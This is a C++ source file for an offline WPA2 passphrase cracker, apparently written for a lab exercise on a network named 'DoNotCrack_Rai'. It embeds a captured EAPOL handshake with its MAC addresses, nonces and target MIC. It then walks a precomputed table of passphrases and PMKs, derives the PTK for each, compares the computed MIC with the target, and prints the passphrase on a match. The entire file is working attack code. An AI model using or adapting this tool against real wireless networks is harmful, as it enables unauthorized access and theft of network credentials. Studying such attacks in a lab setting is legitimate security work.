#include "attack.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>

using namespace std;

/* g++ -o rainbowTable rainbowTable.cpp -lcrypto */
int main() {
    string ssid = "DoNotCrack_Rai";

    string packetHex = "880a3a011856801fac9d588694aad178588694aad17810000000aaaa03000000888e010300970213ca001000000000000000025a0f40e19106702d5cf1b379a2f7866b42392e2ad6ac69a055080b7eb6361ec05a0f40e19106702d5cf1b379a2f7866bdd2700000000000000000000000000000ce1c6362ab05b0aab213566fb09669f0038f99fea570e60a011bd91b9cc1e3893aced17c02bea542360fb5434d224aa371a8a3f87026417e90786e36a023c8186c756d51fa2c13ef381";
    string targetMic = "0ce1c6362ab05b0aab213566fb09669f";
    vector<uint8_t> eapol = changePacketToEapol(packetHex, targetMic);

    vector<uint8_t> amac = hexToBytes("588694aad178");
    vector<uint8_t> smac = hexToBytes("1856801fac9d");
    vector<uint8_t> anonce = hexToBytes("5a0f40e19106702d5cf1b379a2f7866b42392e2ad6ac69a055080b7eb6361ec0");
    vector<uint8_t> snonce = hexToBytes("e2a38dc9ad6d93bdb2a8d84d7a4617daf576cfcc85b8af108bab5838668929cf");
    vector<uint8_t> concMacNonce = concatMacNonce(amac, smac, anonce, snonce);

    ifstream rainbowFile("DoNotCrack_hash", ios::binary);
    if (!rainbowFile.is_open()) {
        cerr << "Error: could not open the rainbow table file." << endl;
        return 1;
    }

    // Read Dummy Header
    char header[40];
    rainbowFile.read(header, 40);
    
    int count = 0;
    while (rainbowFile.peek() != EOF) {
        uint8_t recordSize;
        rainbowFile.read((char*)&recordSize, 1);

        vector<uint8_t> password(8);
        rainbowFile.read((char*)password.data(), 8);
        string passphrase(password.begin(), password.end());

        vector<uint8_t> pmk(32);
        rainbowFile.read((char*)pmk.data(), 32);

        count++;
        cout << "Count: " << count << endl;

        vector<uint8_t> ptk = makePTK(pmk, concMacNonce);
        string mic = makeMIC(ptk, eapol);
        if (mic == targetMic) {
            cout << "Passphrase found: " << passphrase << endl;
            rainbowFile.close();
            return 0;
        }
    }
    cout << "Total records: " << count << endl;
    cout << "Passphrase not found" << endl;

    rainbowFile.close();
    return 0;
}
